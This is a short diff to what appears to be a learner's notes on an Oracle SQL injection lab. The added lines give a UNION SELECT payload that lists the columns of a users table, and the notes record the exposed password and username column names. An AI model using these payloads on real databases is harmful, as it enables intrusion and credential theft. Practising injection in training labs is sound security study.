@@ -28,3 +28,8 @@ Same thing, just with Oracle. Ezpz. I'm a master at this.
 >Pets' union select table_name, null from all_tables--
 
 Table name `USERS_YXUZFJ`
+
+`Pets' union select COLUMN_NAME,null from all_tab_columns where table_name='USERS_YXUZFJ'--`
+Columns:
+PASSWORD_ODOKFU
+USERNAME_DZRUHS
